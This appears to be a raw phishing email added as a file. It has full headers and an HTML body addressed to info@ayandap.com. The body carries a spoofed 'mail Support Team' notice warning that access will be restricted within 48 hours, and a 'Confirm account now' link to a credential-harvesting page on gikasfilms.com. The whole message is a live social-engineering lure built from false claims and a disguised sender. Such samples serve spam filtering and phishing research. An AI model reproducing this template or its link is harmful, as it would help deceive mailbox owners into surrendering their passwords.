@@ -1,0 +1,139 @@
+Return-Path: <soumu@nagahama-shakyo.or.jp>
+Delivered-To: info@ayandap.com
+Received: from lh242.irandns.com
+	by lh242.irandns.com with LMTP
+	id 0PQ+OErGZWXOkwoAzKNLfw
+	(envelope-from <soumu@nagahama-shakyo.or.jp>)
+	for <info@ayandap.com>; Tue, 28 Nov 2023 14:21:54 +0330
+Return-path: <soumu@nagahama-shakyo.or.jp>
+Envelope-to: info@ayandap.com
+Delivery-date: Tue, 28 Nov 2023 14:21:54 +0330
+Received: from linux.pinsoftek.com ([146.88.24.123])
+	by lh242.irandns.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.96.2-12-g29d01ae2a)
+	(envelope-from <soumu@nagahama-shakyo.or.jp>)
+	id 1r7vh3-0031XN-1z
+	for info@ayandap.com;
+	Tue, 28 Nov 2023 14:21:53 +0330
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=aluminiumhydroxidechloride.com; s=default; h=Content-Transfer-Encoding:
+	Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:
+	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
+	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
+	List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=uwXRYwUy3E35oWlKgtDdvgv6ciif0sxsUf9QIqhVYsw=; b=RXlqTUOkiE5ifQ15IuAaaV54Ge
+	NRHenIf7frL6Zop/zDc7Lw986RCx8Jv4cKnIVuDRY4GBADuoAaowKjh7D5H7tm+nsHoT520/jtdVC
+	Wd1/WoqowSZgJKXzjgpDdeurtgnBSXVGR/FPYl4xHUFWxXUdYgEbNOQH3m+KoajOS3XC2RJPA7aSA
+	S1UkudcUNIHgo9ZCw6mSq7YxnWB9Zah+k5VnCrHNuXkbuKI+HwhXiUGxxvT/LsH0gvW6W6VCKc0VV
+	MSYZIQDDpZq2LZSh2LfhNL8+ocftXjoMGpxf8dDKM9MgRoV+xlQg9Mv8K2otWnz6rXGzDvkN/kO6W
+	Vt8zbQ1A==;
+Received: from [45.138.49.91] (port=60482 helo=nagahama-shakyo.or.jp)
+	by 146-88-24-123.cprapid.com with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.95)
+	(envelope-from <soumu@nagahama-shakyo.or.jp>)
+	id 1r7vgz-0006LI-7X
+	for info@ayandap.com;
+	Tue, 28 Nov 2023 16:21:48 +0530
+From: ayandap.com<soumu@nagahama-shakyo.or.jp>
+To: info@ayandap.com
+Subject: Note:  info@ayandap.com  Access to  will be restricted within 48 hours
+Date: 28 Nov 2023 10:51:45 +0000
+Message-ID: <20231128105145.8DCEDEA94CC0E38B@nagahama-shakyo.or.jp>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - 146-88-24-123.cprapid.com
+X-AntiAbuse: Original Domain - ayandap.com
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - nagahama-shakyo.or.jp
+X-Get-Message-Sender-Via: 146-88-24-123.cprapid.com: authenticated_id: director@aluminiumhydroxidechloride.com
+X-Authenticated-Sender: 146-88-24-123.cprapid.com: director@aluminiumhydroxidechloride.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Forward-Confirmed-ReverseDNS: Reverse and forward lookup success on 146.88.24.123, -10 Spam score
+X-DKIM: signer='aluminiumhydroxidechloride.com' status='pass' reason=''
+DKIMCheck: Server passes DKIM test, -20 Spam score
+SpamTally: Final spam score: unset because ESF not run (SpamAssassin unset, whitelist, or skipped)
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.20564"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(34,34,34); FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatu=
+res: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial; text-decoration-style: initial; text-decor=
+ation-color: initial">
+Dear&nbsp; &nbsp;<SPAN style=3D'FONT-SIZE: 16px; FONT-FAMILY: garamond, "ne=
+w york", times, serif; COLOR: rgb(0,0,0)'>info@ayandap.com&nbsp;&nbsp;</SPA=
+N></P>
+<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: =
+normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: r=
+gb(38,38,38); FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: =
+2; LETTER-SPACING: normal; LINE-HEIGHT: normal; TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width=
+: 0px; text-decoration-thickness: initial; text-decoration-style: initial; =
+text-decoration-color: initial; font-stretch:=20
+normal; font-variant-numeric: normal; font-variant-east-asian: normal">You =
+have pending incoming emails that you are yet to receive.</P>
+<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: =
+normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: r=
+gb(38,38,38); FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: =
+2; LETTER-SPACING: normal; LINE-HEIGHT: normal; TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width=
+: 0px; text-decoration-thickness: initial; text-decoration-style: initial; =
+text-decoration-color: initial; font-stretch:=20
+normal; font-variant-numeric: normal; font-variant-east-asian: normal">Acce=
+ss to&nbsp;&nbsp;<SPAN style=3D'FONT-SIZE: 16px; FONT-FAMILY: garamond, "ne=
+w york", times, serif; COLOR: rgb(0,0,0)'>info@ayandap.com&nbsp;</SPAN>will=
+ be restricted until you confirm ownership.</P>
+<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: =
+normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: r=
+gb(38,38,38); FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: =
+2; LETTER-SPACING: normal; LINE-HEIGHT: normal; TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width=
+: 0px; text-decoration-thickness: initial; text-decoration-style: initial; =
+text-decoration-color: initial; font-stretch:=20
+normal; font-variant-numeric: normal; font-variant-east-asian: normal"><B>
+<A style=3D"COLOR: rgb(1,134,186)" href=3D"https://gikasfilms.com/.well-kno=
+wn/pki-validation/control_dotcom.html?login=3Dinfo@ayandap.com" rel=3Dnoope=
+ner target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3D=
+https://prod-api.mailtag.io/link-events?mt__url%3Dhttps%253A%252F%252Fhubs.=
+ly%252FQ01zwGgw0%26mt__id%3D884270cd-1b3e-4158-beb9-2f035534ef8a%23%5B%5Bco=
+nvert_to_base64(-Email-,FALSE)%5D%5D%269K489H-03&amp;source=3Dgmail&amp;ust=
+=3D1700553489821000&amp;usg=3DAOvVaw3oJdsXTKwRfjbbQ4F1aoIo">
+Confirm account now</A></B></P>
+<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: =
+normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: r=
+gb(38,38,38); FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: =
+2; LETTER-SPACING: normal; LINE-HEIGHT: normal; TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width=
+: 0px; text-decoration-thickness: initial; text-decoration-style: initial; =
+text-decoration-color: initial; font-stretch:=20
+normal; font-variant-numeric: normal; font-variant-east-asian: normal">Note=
+: Access to&nbsp; will be restricted within 48 hours.</P>
+<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: =
+normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: r=
+gb(38,38,38); FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: =
+2; LETTER-SPACING: normal; LINE-HEIGHT: normal; TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width=
+: 0px; text-decoration-thickness: initial; text-decoration-style: initial; =
+text-decoration-color: initial; font-stretch:=20
+normal; font-variant-numeric: normal; font-variant-east-asian: normal"><BR>=
+Regards<BR></P>
+<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: =
+normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: r=
+gb(38,38,38); FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: =
+2; LETTER-SPACING: normal; LINE-HEIGHT: normal; TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width=
+: 0px; text-decoration-thickness: initial; text-decoration-style: initial; =
+text-decoration-color: initial; font-stretch:=20
+normal; font-variant-numeric: normal; font-variant-east-asian: normal">mail=
+ Support Team</P></BODY></HTML>
